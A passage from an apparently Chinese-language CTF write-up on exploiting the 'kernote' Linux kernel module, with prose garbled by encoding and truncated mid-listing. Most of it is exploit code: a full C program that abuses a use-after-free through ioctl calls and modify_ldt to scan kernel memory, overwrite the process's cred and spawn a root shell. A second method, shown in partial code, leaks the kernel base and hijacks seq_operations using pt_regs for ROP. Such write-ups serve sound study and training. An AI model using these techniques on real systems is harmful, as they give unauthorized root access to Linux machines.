function_">chunkAdd</span><span class="params">(<span class="type">int</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(kernote_fd, <span class="number">0x6667</span>, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunkDel</span><span class="params">(<span class="type">int</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(kernote_fd, <span class="number">0x6668</span>, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunkEdit</span><span class="params">(<span class="type">size_t</span> data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(kernote_fd, <span class="number">0x6669</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">chunkFuck</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(kernote_fd, <span class="number">0x666A</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv, <span class="type">char</span> ** envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span>     <span class="title">desc</span>;</span></span><br><span class="line">    <span class="type">size_t</span>                 page_offset_base = <span class="number">0xffff888000000000</span>;</span><br><span class="line">    <span class="type">size_t</span>              temp;</span><br><span class="line">    <span class="type">int</span>                 retval;</span><br><span class="line">    <span class="type">size_t</span>                cred_addr;</span><br><span class="line">    <span class="type">size_t</span>                search_addr;</span><br><span class="line">    <span class="type">size_t</span>              per_search_addr;</span><br><span class="line">    <span class="type">size_t</span>              *result_addr;</span><br><span class="line">    <span class="type">int</span>                   cur_pid;</span><br><span class="line">    <span class="type">char</span>                *buf;</span><br><span class="line">    <span class="type">int</span>                 pipe_fd[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">cpu_set_t</span>           cpu_set;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Start to exploit... \033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    desc.base_addr = <span class="number">0xff0000</span>;</span><br><span class="line">    desc.entry_number = <span class="number">0x8000</span> / <span class="number">8</span>;</span><br><span class="line">    desc.limit = <span class="number">0</span>;</span><br><span class="line">    desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">    desc.contents = <span class="number">0</span>;</span><br><span class="line">    desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">    desc.lm = <span class="number">0</span>;</span><br><span class="line">    desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">    desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">    desc.useable = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    kernote_fd = open(<span class="string">&quot;/dev/kernote&quot;</span>, O_RDWR);</span><br><span class="line">    chunkAdd(<span class="number">0</span>);</span><br><span class="line">    chunkSet(<span class="number">0</span>);</span><br><span class="line">    chunkDel(<span class="number">0</span>);</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//printf(&quot;\033[34m\033[1m[*] now checking: \033[0m%lx\n&quot;, page_offset_base);</span></span><br><span class="line">        chunkEdit(page_offset_base);</span><br><span class="line">        retval = syscall(SYS_modify_ldt, <span class="number">0</span>, &amp;temp, <span class="number">8</span>);<span class="comment">// final param should be 8 there</span></span><br><span class="line">        <span class="keyword">if</span> (retval &gt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        page_offset_base += <span class="number">0x4000000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found page_offset_base: \033[0m%lx\n&quot;</span>, page_offset_base);</span><br><span class="line"></span><br><span class="line">    cur_pid = getpid();</span><br><span class="line">    prctl(PR_SET_NAME, <span class="string">&quot;arttnba3pwnn&quot;</span>);</span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    buf = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, <span class="number">0x8000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    search_addr = page_offset_base;</span><br><span class="line">    cred_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        chunkEdit(search_addr);</span><br><span class="line">        retval = fork();</span><br><span class="line">        <span class="keyword">if</span> (!retval)    <span class="comment">// child</span></span><br><span class="line">        &#123;</span><br><span class="line">            syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x8000</span>);</span><br><span class="line">            result_addr = (<span class="type">size_t</span>*) memmem(buf, <span class="number">0x8000</span>, <span class="string">&quot;arttnba3pwnn&quot;</span>, <span class="number">12</span>);</span><br><span class="line">            <span class="keyword">if</span> (result_addr \</span><br><span class="line">                &amp;&amp; (result_addr[<span class="number">-2</span>] &gt; page_offset_base) \</span><br><span class="line">                &amp;&amp; (result_addr[<span class="number">-3</span>] &gt; page_offset_base) \</span><br><span class="line">                &amp;&amp; (((<span class="type">int</span>) result_addr[<span class="number">-58</span>]) == cur_pid))</span><br><span class="line">            &#123;</span><br><span class="line">                cred_addr = result_addr[<span class="number">-2</span>]; <span class="comment">// task_struct-&gt;cred</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found cred: \033[0m%lx\n&quot;</span>, cred_addr);</span><br><span class="line">            &#125;</span><br><span class="line">            write(pipe_fd[<span class="number">1</span>], &amp;cred_addr, <span class="number">8</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipe_fd[<span class="number">0</span>], &amp;cred_addr, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (cred_addr)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        search_addr += <span class="number">0x8000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//chunkEdit(cred_addr + 4);</span></span><br><span class="line">    retval = fork();</span><br><span class="line">    <span class="keyword">if</span> (!retval) <span class="comment">// child</span></span><br><span class="line">    &#123;</span><br><span class="line">        retval = fork();</span><br><span class="line">        <span class="keyword">if</span> (!retval) <span class="comment">// child&#x27;s child</span></span><br><span class="line">        &#123;</span><br><span class="line">            CPU_ZERO(&amp;cpu_set);</span><br><span class="line">            CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">            sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">            sleep(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">15</span>; i++)</span><br><span class="line">                chunkAdd(i);</span><br><span class="line">            chunkSet(<span class="number">11</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">15</span>; i++)</span><br><span class="line">                chunkDel(i);</span><br><span class="line">            CPU_ZERO(&amp;cpu_set);</span><br><span class="line">            CPU_SET(<span class="number">1</span>, &amp;cpu_set);</span><br><span class="line">            sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">                chunkEdit(cred_addr + <span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        CPU_ZERO(&amp;cpu_set);</span><br><span class="line">        CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">        sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">        desc.base_addr = <span class="number">0</span>;</span><br><span class="line">        desc.entry_number = <span class="number">2</span>;</span><br><span class="line">        desc.limit = <span class="number">0</span>;</span><br><span class="line">        desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">        desc.contents = <span class="number">0</span>;</span><br><span class="line">        desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">        desc.lm = <span class="number">0</span>;</span><br><span class="line">        desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">        desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">        desc.useable = <span class="number">0</span>;</span><br><span class="line">        sleep(<span class="number">3</span>);</span><br><span class="line">        syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line">        sleep(<span class="number">114514</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">if</span> (geteuid())</span><br><span class="line">        errExit(<span class="string">&quot;FAILED TO GET THE ROOT!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] SUCCESSFUL to get the ROOT, execve ROOT SHELL soom...\033[0m&quot;</span>);</span><br><span class="line">    setreuid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    setregid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>æ‰“è¿œç¨‹çš„è„šæœ¬å¯ä»¥å‚ç…§ kbrop çš„</p></blockquote><p>ä¸ä¸€å®šèƒ½ä¸€æ¬¡æˆåŠŸï¼Œæœ‰çš„æ—¶å€™éœ€è¦å¤šè¯•å‡ æ¬¡ï¼Œç¬”è€…ä¸ªäººæ¨æµ‹åº”å½“æ˜¯ freelist éšæœºåŒ–çš„ç¼˜æ•…</p><p><img src="https://i.loli.net/2021/10/31/QI7FzGx3RYDlPfE.png" alt="image.png"></p><h3 id="è§£æ³•äºŒï¼šåŠ«æŒ-seq-operations-åˆ©ç”¨-pt-regs-è¿›è¡Œ-ROP-å®Œæˆç¨³å®šåŒ–ææƒ"><a href="#è§£æ³•äºŒï¼šåŠ«æŒ-seq-operations-åˆ©ç”¨-pt-regs-è¿›è¡Œ-ROP-å®Œæˆç¨³å®šåŒ–ææƒ" class="headerlink" title="è§£æ³•äºŒï¼šåŠ«æŒ seq_operations åˆ©ç”¨ pt_regs è¿›è¡Œ ROP å®Œæˆç¨³å®šåŒ–ææƒ"></a>è§£æ³•äºŒï¼šåŠ«æŒ seq_operations åˆ©ç”¨ pt_regs è¿›è¡Œ ROP å®Œæˆç¨³å®šåŒ–ææƒ</h3><p>è¿™ä¸ªè§£æ³•æ˜¯ç¬”è€…<strong>ç»“åˆå®˜æ–¹çš„è§£æ³•ä¸å† å†›æˆ˜é˜Ÿ organizers çš„è§£æ³•å¾—æ¥çš„æ–°è§£æ³•</strong>ï¼Œå‰é¢ä¸¤æ­¥åŸºæœ¬ä¸Šå’Œå®˜æ–¹è§£æ³•æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯åˆ©ç”¨ modify_ldt ç³»ç»Ÿè°ƒç”¨è¯»å–å†…æ ¸ç©ºé—´çš„æ•°æ®ï¼Œä¸åŒçš„æ˜¯ç¬”è€…åœ¨è¿™ä¸€æ­¥ä¸­é€‰æ‹©è¯»å‡ºå†…æ ¸â€œå †â€ä¸Šå­˜å‚¨çš„æŒ‡é’ˆä»¥æ³„éœ²å†…æ ¸åŸºå€ï¼Œæœ€ååŠ«æŒ seq_operations è¿›è¡Œç¨³å®šåŒ–ææƒ</p><h4 id="Step-I-æ³„éœ²-page-offset-base-1"><a href="#Step-I-æ³„éœ²-page-offset-base-1" class="headerlink" title="Step I. æ³„éœ² page_offset_base"></a>Step I. æ³„éœ² page_offset_base</h4><p>å’Œè§£æ³•ä¸€ç›¸åŒï¼Œåˆ©ç”¨ read_ldt() ä¸ copy ç³»å‡½æ•°ä¸ä¼šå¼•èµ· kernel panic çš„ç‰¹æ€§çˆ†ç ´å†…æ ¸çš„â€œå †â€åŒº</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span>     <span class="title">desc</span>;</span></span><br><span class="line"><span class="type">size_t</span>                 page_offset_base = <span class="number">0xffff888000000000</span>;</span><br><span class="line"><span class="type">int</span>                 retval;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">chunkSet(<span class="number">0</span>);</span><br><span class="line">chunkDel(<span class="number">0</span>);</span><br><span class="line">syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    chunkEdit(page_offset_base);</span><br><span class="line">    retval = syscall(SYS_modify_ldt, <span class="number">0</span>, &amp;desc, <span class="number">8</span>);<span class="comment">// final param should be 8 there</span></span><br><span class="line">    <span class="keyword">if</span> (retval &gt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    page_offset_base += <span class="number">0x2000000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Step-II-æ³„éœ²å†…æ ¸åŸºå€"><a href="#Step-II-æ³„éœ²å†…æ ¸åŸºå€" class="headerlink" title="Step II. æ³„éœ²å†…æ ¸åŸºå€"></a>Step II. æ³„éœ²å†…æ ¸åŸºå€</h4><p>è¿™ä¸€æ­¥å’Œè§£æ³•ä¸€çš„ step II ç›¸åŒï¼Œä¸åŒçš„æ˜¯ç¬”è€…åœ¨è¿™ä¸€æ­¥é€šè¿‡å­è¿›ç¨‹è·å–åˆ°å†…æ ¸â€œå †â€ä¸Šæ•°æ®åå¹¶éç”¨ä»¥æœç´¢ task_struct åœ°å€ï¼Œè€Œæ˜¯å°è¯•<strong>æ‰¾åˆ°å±äºå†…æ ¸çš„å‡½æ•°æŒ‡é’ˆï¼Œä»¥æ­¤æ³„éœ²å†…æ ¸åŸºå€</strong></p><p>ç»è¿‡ç¬”è€…è°ƒè¯•å‘ç° <code>å†…æ ¸åŸºå€ + 0x40</code> è¿™ä¸ªåœ°å€ç»å¸¸åœ¨å†…æ ¸â€œå †â€ä¸€å¼€å¤´ä¸è¿œçš„åœ°æ–¹å°±ä¼šå‡ºç°ï¼ˆå°šæœªéªŒè¯å…·ä½“ä¸ºä½•æŒ‡é’ˆï¼‰ï¼Œæ•…ç¬”è€…é€‰æ‹©ä»¥è¯¥æ•°æ®æ¥è®¡ç®—å†…æ ¸åŸºå€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        chunkEdit(search_addr);</span><br><span class="line">        retval = fork();</span><br><span class="line">        <span class="keyword">if</span> (!retval)    <span class="comment">// child</span></span><br><span class="line">        &#123;</span><br><span class="line">            syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x8000</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (buf[i] &gt; <span class="number">0xffffffff81000000</span> &amp;&amp; (buf[i] &amp; <span class="number">0xfff</span>) == <span class="number">0x040</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    kernel_base = buf[i] -  <span class="number">0x040</span>;</span><br><span class="line">                    kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m%lx\n&quot;</span>, kernel_base);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m%lx\n&quot;</span>, kernel_offset);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            write(pipe_fd[<span class="number">1</span>], &amp;kernel_base, <span class="number">8</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipe_fd[<span class="number">0</span>], &amp;kernel_base, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (kernel_base)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        search_addr += <span class="number">0x8000</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>ç»ç¬”è€…æœ¬åœ°å¤šæ¬¡å®éªŒï¼Œè¿™ä¸ªåœ°å€<strong>æ€»ä¼šå‡ºç°åœ¨å†…æ ¸â€œå †â€çš„ 0x9d000 åç§»å¤„</strong>ï¼Œæˆ–è®¸æˆ‘ä»¬æ€»èƒ½ä»è¯¥åœ°å€ç¨³å®šåœ°æ³„éœ²å‡ºå†…æ ¸çš„åŸºå€ï¼Ÿ</p></blockquote><h4 id="Step-III-åˆ©ç”¨-seq-operations-pt-regs-ç»“æ„ä½“å®Œæˆç¨³å®šåŒ–-ROP-è¿›è¡Œææƒ"><a href="#Step-III-åˆ©ç”¨-seq-operations-pt-regs-ç»“æ„ä½“å®Œæˆç¨³å®šåŒ–-ROP-è¿›è¡Œææƒ" class="headerlink" title="Step III. åˆ©ç”¨ seq_operations + pt_regs ç»“æ„ä½“å®Œæˆç¨³å®šåŒ– ROP è¿›è¡Œææƒ"></a>Step III. åˆ©ç”¨ seq_operations + pt_regs ç»“æ„ä½“å®Œæˆç¨³å®šåŒ– ROP è¿›è¡Œææƒ</h4><blockquote><p>å‚ç…§äº†ä»Šå¹´çš„å† å†›æˆ˜é˜Ÿ Organizers çš„ <a href="https://ctftime.org/writeup/30589">WP</a>ï¼Œååˆ†ç¾å¦™çš„ä¸€ç§è§£æ³•ï¼</p></blockquote><p>ç°åœ¨æœ‰äº†å†…æ ¸åŸºå€ï¼Œæˆ‘ä»¬åˆèƒ½åˆ†é… 0x20 å¤§å°çš„ objectï¼Œè¿™ä¸ªå¤§å°æœ‰ä¸ªç»“æ„ä½“ç›¸ä¿¡å¤§å®¶éƒ½ååˆ†ç†Ÿæ‚‰â€”â€”<code>seq_operations</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> * (*start) (<span class="keyword">struct</span> seq_file *m, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">void</span> (*stop) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">    <span class="type">void</span> * (*next) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">int</span> (*show) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å…¶ <code>start</code> æŒ‡é’ˆ<strong>æ—¢æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬å¯ä»¥è§¦å‘çš„</strong>ï¼Œæˆ‘ä»¬åªéœ€è¦æ‰“å¼€ <code>/proc/self/stat</code> æ–‡ä»¶è¿›è¡Œè¯»å–å³å¯è§¦å‘è¯¥æŒ‡é’ˆï¼Œè¿™è®©æˆ‘ä»¬å¾ˆè½»æ¾åœ°å°±èƒ½æ§åˆ¶å†…æ ¸æ‰§è¡Œæµ</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥è€ƒè™‘å¦‚ä½•ä»…ä½¿ç”¨ä¸€ä¸ªæŒ‡é’ˆä¾¿èƒ½å®Œæˆ ROP çš„æµç¨‹ï¼Œè¿™é‡Œéœ€è¦ç”¨åˆ°ä¸€ä¸ªå«åš pt_regs çš„ç»“æ„ä½“ï¼Œè¯¥ç»“æ„ä½“çš„<a href="https://elixir.bootlin.com/linux/latest/source/arch/x86/include/uapi/asm/ptrace.h#L44">å®šä¹‰</a>å¦‚ä¸‹ï¼š </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r15;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r14;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r13;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r12;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r11;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rcx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rip;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> cs;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªååˆ†æœ‰è¶£çš„ç»“æ„ä½“ï¼Œæˆ‘ä»¬è§‚å¯Ÿåˆ°å…¶å„å­—æ®µå‘½åä½¿ç”¨çš„<strong>å…¨éƒ½æ˜¯å¯„å­˜å™¨çš„åç§°</strong>ï¼Œè¿™æ˜¯å› ä¸ºè¯¥ç»“æ„ä½“ä¸ç³»ç»Ÿè°ƒç”¨çš„æµç¨‹æœ‰å…³ï¼Œå†…æ ¸ä¸­å¤„ç†ç³»ç»Ÿè°ƒç”¨çš„å…¥å£å‡½æ•°ä¸º <code>entry_SYSCALL_64</code>ï¼Œå…¶æºç ä¸­æœ‰ç€<a href="https://elixir.bootlin.com/linux/latest/source/arch/x86/entry/entry_64.S#L107">è¿™æ ·ä¸€æ¡æŒ‡ä»¤</a>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUSH_AND_CLEAR_REGS rax=$-ENOSYSCopy</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€æ¡ååˆ†æœ‰è¶£çš„æŒ‡ä»¤ï¼Œå®ƒä¼šå°†æ‰€æœ‰çš„å¯„å­˜å™¨<strong>å‹å…¥å†…æ ¸æ ˆä¸Šï¼Œå½¢æˆä¸€ä¸ª pt_regs ç»“æ„ä½“</strong>ï¼Œè¯¥ç»“æ„ä½“å®è´¨ä¸Šä½äºå†…æ ¸æ ˆåº•ï¼š</p><p>[<img src="https://i.loli.net/2021/11/14/NwjgEMse8cTCdLr.png" alt="image.png">](</p><p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼Œå½“æˆ‘ä»¬åŠ«æŒå†…æ ¸ç»“æ„ä½“ä¸­çš„æŸä¸ªå‡½æ•°æŒ‡é’ˆæ—¶ï¼Œåœ¨æˆ‘ä»¬é€šè¿‡è¯¥å‡½æ•°æŒ‡é’ˆåŠ«æŒå†…æ ¸æ‰§è¡Œæµæ—¶ <strong>rsp ä¸ æ ˆåº•çš„ç›¸å¯¹åç§»é€šå¸¸æ˜¯ä¸å˜çš„</strong></p><p>è€Œåœ¨ç³»ç»Ÿè°ƒç”¨å½“ä¸­è¿‡ç¨‹æœ‰å¾ˆå¤šçš„å¯„å­˜å™¨å…¶å®æ˜¯ä¸ä¸€å®šèƒ½ç”¨ä¸Šçš„ï¼Œæ¯”å¦‚ r8 ~ r15ï¼Œ<strong>è¿™äº›å¯„å­˜å™¨ä¸ºæˆ‘ä»¬å¸ƒç½® ROP é“¾æä¾›äº†å¯èƒ½ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°ï¼š</strong></p><ul><li><strong>åªéœ€è¦å¯»æ‰¾åˆ°ä¸€æ¡å½¢å¦‚ â€œadd rsp, val ; retâ€ çš„ gadget è¿›è¡Œæ ˆè¿ç§»ä¾¿èƒ½å¤Ÿå®Œæˆ ROP</strong></li></ul><h4 id="FINAL-EXPLOIT-1"><a href="#FINAL-EXPLOIT-1" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h4><p>æœ€ç»ˆçš„ exp å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 